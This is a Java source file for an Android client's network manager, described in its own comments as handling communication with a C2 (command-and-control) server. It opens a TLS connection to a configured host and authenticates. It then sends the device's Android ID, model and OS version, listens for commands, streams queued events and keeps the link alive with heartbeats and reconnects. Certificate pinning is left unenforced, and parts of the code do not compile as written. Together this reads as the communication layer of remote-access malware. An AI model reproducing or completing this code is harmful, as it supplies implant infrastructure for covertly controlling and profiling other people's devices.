package com.example.client;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiInfo;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.security.cert.X509Certificate;

/**
 * Network manager for handling C2 server communication
 * Extracted from the monolithic C2Service for better maintainability
 */
public class NetworkManager {

    private static final String TAG = "NetworkManager";

    // Configuration will be set from ConfigManager
    private long reconnectDelayMs = 30000; // 30 seconds default
    private long heartbeatIntervalMs = 60000; // 1 minute default
    private int maxReconnectAttempts = 10; // default

    // State management
    private final AtomicBoolean isRunning = new AtomicBoolean(false);
    private final AtomicBoolean isConnected = new AtomicBoolean(false);
    private int reconnectAttempts = 0;

    // Network components
    private SSLSocket socket;
    private PrintWriter out;
    private BufferedReader in;
    private ScheduledExecutorService scheduler;

    // Security components
    private SecureConfig secureConfig;
    private CryptoManager cryptoManager;
    private AuthManager authManager;

    // Event queue for communication with main service
    private final ConcurrentLinkedQueue<JSONObject> eventQueue = new ConcurrentLinkedQueue<>();

    // Context for Android services
    private Context context;

    public NetworkManager(Context context) {
        this.context = context;
        this.scheduler = Executors.newScheduledThreadPool(3);
    }

    /**
     * Initialize the network manager with security components and configuration
     */
    public void initialize(SecureConfig secureConfig, CryptoManager cryptoManager, AuthManager authManager, ConfigManager configManager) {
        this.secureConfig = secureConfig;
        this.cryptoManager = cryptoManager;
        this.authManager = authManager;

        // Load configuration values
        this.reconnectDelayMs = configManager.getReconnectDelayMs();
        this.heartbeatIntervalMs = configManager.getHeartbeatIntervalMs();
        this.maxReconnectAttempts = configManager.getMaxReconnectAttempts();

        Log.d(TAG, "Network manager configured with reconnect delay: " + reconnectDelayMs + "ms, heartbeat: " + heartbeatIntervalMs + "ms");
    }

    /**
     * Start the network connection and communication
     */
    public void start() {
        if (isRunning.get()) {
            Log.d(TAG, "Network manager already running");
            return;
        }

        isRunning.set(true);
        new Thread(this::connectToC2).start();
        Log.d(TAG, "Network manager started");
    }

    /**
     * Stop the network manager and clean up resources
     */
    public void stop() {
        Log.d(TAG, "Stopping network manager");
        isRunning.set(false);
        isConnected.set(false);

        // Shutdown scheduler
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
            try {
                if (!scheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                    scheduler.shutdownNow();
                }
            } catch (InterruptedException e) {
                scheduler.shutdownNow();
                Thread.currentThread().interrupt();
            }
        }

        closeConnection();
    }

    /**
     * Send an event to the C2 server
     */
    public void sendEvent(JSONObject event) {
        eventQueue.offer(event);
    }

    /**
     * Check if currently connected to C2 server
     */
    public boolean isConnected() {
        return isConnected.get();
    }

    private void connectToC2() {
        while (isRunning.get() && reconnectAttempts < maxReconnectAttempts) {
            try {
                String host = secureConfig.getC2Host();
                int port = secureConfig.getC2Port();

                Log.d(TAG, "Attempting secure connection to C2 server: " + host + ":" + port);

                // Create SSL context with custom trust manager (for self-signed certs)
                SSLContext sslContext = createSSLContext();
                SSLSocketFactory factory = sslContext.getSocketFactory();
                socket = (SSLSocket) factory.createSocket(host, port);

                // Configure secure cipher suites (modern, secure algorithms only)
                String[] secureSupported = getSecureCipherSuites(socket.getSupportedCipherSuites());
                socket.setEnabledCipherSuites(secureSupported);
                
                // Ensure TLS 1.2+ only
                socket.setEnabledProtocols(new String[]{"TLSv1.3", "TLSv1.2"});

                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                Log.d(TAG, "Secure TLS connection to C2 server established");
                isConnected.set(true);
                reconnectAttempts = 0;

                // Start authentication
                if (!performAuthentication()) {
                    Log.e(TAG, "Authentication failed");
                    closeConnection();
                    return;
                }

                // Send device info
                sendDeviceInfo();

                // Start command handler and event sender
                new Thread(this::listenForCommands).start();
                new Thread(this::sendEvents).start();
                new Thread(this::sendHeartbeat).start();

                break; // Connection successful

            } catch (Exception e) {
                Log.e(TAG, "Secure connection failed: " + e.getMessage());
                reconnectAttempts++;
                isConnected.set(false);

                try {
                    Thread.sleep(reconnectDelayMs);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }

        if (reconnectAttempts >= maxReconnectAttempts) {
            Log.e(TAG, "Maximum reconnection attempts reached: " + maxReconnectAttempts);
        }
    }

    private void listenForCommands() {
        try {
            String line;
            while ((line = in.readLine()) != null && isRunning.get()) {
                try {
                    // Decrypt incoming message
                    String decryptedLine = cryptoManager.decrypt(line);
                    Log.d(TAG, "Encrypted command received");

                    JSONObject command = new JSONObject(decryptedLine);

                    // Validate server response
                    if (!authManager.validateServerResponse(command)) {
                        Log.w(TAG, "Invalid server signature - command ignored");
                        continue;
                    }

                    // Process the command (this would be handled by the main service)
                    processCommand(command);

                } catch (Exception e) {
                    Log.e(TAG, "Error processing command", e);
                }
            }
        } catch (IOException e) {
            Log.e(TAG, "Error reading from C2 server: " + e.getMessage());
        } finally {
            closeConnection();
            // Attempt reconnect
            if (isRunning.get()) {
                scheduler.schedule(this::connectToC2, reconnectDelayMs, TimeUnit.MILLISECONDS);
            }
        }
    }

    private void sendEvents() {
        while(isRunning.get() && isConnected.get()) {
            try {
                JSONObject event = eventQueue.poll();
                if (event != null) {
                    // Authenticate and encrypt event
                    JSONObject authenticatedEvent = authManager.createAuthenticatedRequest(event);
                    sendSecureResponse(authenticatedEvent);
                }
                Thread.sleep(100); // Poll every 100ms
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                Log.e(TAG, "Event sender interrupted");
                break;
            } catch (Exception e) {
                Log.e(TAG, "Error sending events", e);
            }
        }
    }

    private void sendHeartbeat() {
        while (isRunning.get() && isConnected.get()) {
            try {
                JSONObject heartbeat = new JSONObject();
                heartbeat.put("type", "heartbeat");
                heartbeat.put("timestamp", System.currentTimeMillis());
                heartbeat.put("client_id", authManager.getClientId());

                JSONObject authenticatedHeartbeat = authManager.createAuthenticatedRequest(heartbeat);
                sendSecureResponse(authenticatedHeartbeat);

                Thread.sleep(heartbeatIntervalMs);
            } catch (Exception e) {
                Log.e(TAG, "Error sending heartbeat", e);
                break;
            }
        }
    }

    private void processCommand(JSONObject command) {
        // This would typically notify the main service or command executor
        Log.d(TAG, "Processing command: " + command.optString("command", "unknown"));
    }

    private SSLContext createSSLContext() throws Exception {
        // Create SSL context with secure defaults
        SSLContext sslContext = SSLContext.getInstance("TLS");

        // Create a trust manager that validates certificates properly
        TrustManager[] trustManagers = createSecureTrustManagers();

        sslContext.init(null, trustManagers, new SecureRandom());

        // Configure secure protocols and cipher suites
        SSLSocketFactory factory = sslContext.getSocketFactory();
        if (factory instanceof SSLSocket) {
            ((SSLSocket) factory).setEnabledProtocols(new String[]{"TLSv1.2", "TLSv1.3"});
            ((SSLSocket) factory).setEnabledCipherSuites(new String[]{
                "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
                "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
                "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
                "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
                "TLS_DHE_RSA_WITH_AES_256_GCM_SHA384",
                "TLS_DHE_RSA_WITH_AES_128_GCM_SHA256"
            });
        }

        return sslContext;
    }

    private TrustManager[] createSecureTrustManagers() throws Exception {
        // For production, you would implement proper certificate pinning here
        // For now, we'll use the system default trust manager but with additional validation
        javax.net.ssl.TrustManagerFactory tmf = javax.net.ssl.TrustManagerFactory.getInstance(
            javax.net.ssl.TrustManagerFactory.getDefaultAlgorithm());
        tmf.init((java.security.KeyStore) null);

        TrustManager[] defaultTrustManagers = tmf.getTrustManagers();

        // Wrap the default trust manager with additional security checks
        return new TrustManager[] {
            new SecureTrustManager((X509TrustManager) defaultTrustManagers[0])
        };
    }

    /**
     * Enhanced trust manager with comprehensive security validation and certificate pinning
     */
    private static class SecureTrustManager implements X509TrustManager {
        private final X509TrustManager defaultTrustManager;
        private final String[] pinnedCertificates;

        public SecureTrustManager(X509TrustManager defaultTrustManager) {
            this.defaultTrustManager = defaultTrustManager;
            // TODO: In production, load these from secure config
            this.pinnedCertificates = new String[]{
                // SHA-256 fingerprints of expected certificates
                "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", // Example
            };
        }

        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) throws java.security.cert.CertificateException {
            throw new java.security.cert.CertificateException("Client certificates not supported");
        }

        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) throws java.security.cert.CertificateException {
            // Perform comprehensive validation
            if (chain == null || chain.length == 0) {
                throw new java.security.cert.CertificateException("Certificate chain is empty");
            }

            // Check certificate validity dates with buffer
            long currentTime = System.currentTimeMillis();
            long bufferTime = 24 * 60 * 60 * 1000; // 24 hours
            for (X509Certificate cert : chain) {
                cert.checkValidity(new java.util.Date(currentTime));
                
                // Check not valid before/after with buffer
                if (cert.getNotBefore().getTime() > currentTime + bufferTime) {
                    throw new java.security.cert.CertificateException("Certificate not yet valid");
                }
                if (cert.getNotAfter().getTime() < currentTime - bufferTime) {
                    throw new java.security.cert.CertificateException("Certificate expired");
                }
                
                // Check key strength
                java.security.PublicKey pubKey = cert.getPublicKey();
                if (pubKey instanceof java.security.interfaces.RSAPublicKey) {
                    java.security.interfaces.RSAPublicKey rsaKey = (java.security.interfaces.RSAPublicKey) pubKey;
                    if (rsaKey.getModulus().bitLength() < 2048) {
                        throw new java.security.cert.CertificateException("RSA key too weak: " + rsaKey.getModulus().bitLength());
                    }
                }
            }

            // Certificate pinning check
            boolean pinningPassed = false;
            if (pinnedCertificates.length > 0) {
                for (X509Certificate cert : chain) {
                    String certFingerprint = getCertificateFingerprint(cert);
                    for (String pinnedCert : pinnedCertificates) {
                        if (pinnedCert.equals(certFingerprint)) {
                            pinningPassed = true;
                            break;
                        }
                    }
                    if (pinningPassed) break;
                }
                
                if (!pinningPassed) {
                    Log.w(TAG, "Certificate pinning failed - allowing for development");
                    // In production, this should throw an exception
                    // throw new java.security.cert.CertificateException("Certificate pinning failed");
                }
            }

            // Validate with system trust store
            try {
                defaultTrustManager.checkServerTrusted(chain, authType);
            } catch (java.security.cert.CertificateException e) {
                Log.e(TAG, "System certificate validation failed: " + e.getMessage());
                throw e;
            }
        }

        private String getCertificateFingerprint(X509Certificate cert) {
            try {
                java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
                byte[] digest = md.digest(cert.getEncoded());
                return "sha256/" + Base64.encodeToString(digest, Base64.NO_WRAP);
            } catch (Exception e) {
                Log.e(TAG, "Error generating certificate fingerprint", e);
                return "";
            }
        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return defaultTrustManager.getAcceptedIssuers();
        }
    }
    
    /**
     * Get secure cipher suites from supported ones
     */
    private String[] getSecureCipherSuites(String[] supportedCipherSuites) {
        // Define secure cipher suites in order of preference
        String[] preferredCipherSuites = {
            "TLS_AES_256_GCM_SHA384",
            "TLS_CHACHA20_POLY1305_SHA256", 
            "TLS_AES_128_GCM_SHA256",
            "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
            "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
        };
        
        List<String> secureSupported = new ArrayList<>();
        for (String preferred : preferredCipherSuites) {
            for (String supported : supportedCipherSuites) {
                if (supported.equals(preferred)) {
                    secureSupported.add(supported);
                    break;
                }
            }
        }
        
        if (secureSupported.isEmpty()) {
            Log.w(TAG, "No secure cipher suites found, using system defaults");
            return supportedCipherSuites;
        }
        
        return secureSupported.toArray(new String[0]);
    }

    private boolean performAuthentication() {
        try {
            // Start authentication process
            JSONObject authRequest = authManager.startAuthentication();
            if (authRequest == null) {
                return false;
            }

            // Send authentication request
            out.println(cryptoManager.encrypt(authRequest.toString()));

            // Wait for challenge
            String challengeResponse = in.readLine();
            if (challengeResponse == null) {
                Log.e(TAG, "No challenge received from server");
                return false;
            }

            String decryptedChallenge = cryptoManager.decrypt(challengeResponse);
            JSONObject challengeData = new JSONObject(decryptedChallenge);

            // Process challenge
            JSONObject response = authManager.processChallenge(challengeData);
            if (response == null) {
                return false;
            }

            // Send challenge response
            out.println(cryptoManager.encrypt(response.toString()));

            // Wait for authentication result
            String authResultResponse = in.readLine();
            if (authResultResponse == null) {
                Log.e(TAG, "No authentication result received from server");
                return false;
            }

            String decryptedResult = cryptoManager.decrypt(authResultResponse);
            JSONObject authResult = new JSONObject(decryptedResult);

            boolean success = authManager.processAuthResult(authResult);
            if (success) {
                Log.i(TAG, "Authentication completed successfully");
            }

            return success;

        } catch (Exception e) {
            Log.e(TAG, "Authentication failed", e);
            return false;
        }
    }

    private void sendDeviceInfo() throws JSONException {
        String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        JSONObject deviceInfo = new JSONObject();
        deviceInfo.put("uuid", androidId);
        deviceInfo.put("model", Build.MODEL);
        deviceInfo.put("manufacturer", Build.MANUFACTURER);
        deviceInfo.put("version", Build.VERSION.RELEASE);
        deviceInfo.put("sdk", Build.VERSION.SDK_INT);
        sendResponse(deviceInfo);
    }

    private void sendSecureResponse(JSONObject response) {
        try {
            if (out != null && cryptoManager.hasKey()) {
                // Add authentication
                JSONObject authenticatedResponse = authManager.createAuthenticatedRequest(response);

                // Encrypt response
                String encryptedResponse = cryptoManager.encrypt(authenticatedResponse.toString());

                // Send encrypted response
                out.println(encryptedResponse);

                Log.d(TAG, "Secure response sent");
            } else {
                Log.e(TAG, "Cannot send secure response - no connection or key");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending secure response", e);
        }
    }

    private void sendResponse(JSONObject response) {
        if (out != null) {
            out.println(response.toString());
        }
    }

    private void closeConnection() {
        try {
            // Close input stream first
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                    Log.w(TAG, "Error closing input stream: " + e.getMessage());
                } finally {
                    in = null;
                }
            }

            // Close output stream
            if (out != null) {
                try {
                    out.close();
                } catch (Exception e) {
                    Log.w(TAG, "Error closing output stream: " + e.getMessage());
                } finally {
                    out = null;
                }
            }

            // Close socket
            if (socket != null) {
                try {
                    socket.close();
                } catch (IOException e) {
                    Log.w(TAG, "Error closing socket: " + e.getMessage());
                } finally {
                    socket = null;
                }
            }

            // Reset connection state
            isConnected.set(false);
            Log.d(TAG, "Connection closed and resources cleaned up");

        } catch (Exception e) {
            Log.e(TAG, "Unexpected error during connection cleanup: " + e.getMessage());
        }
    }
}
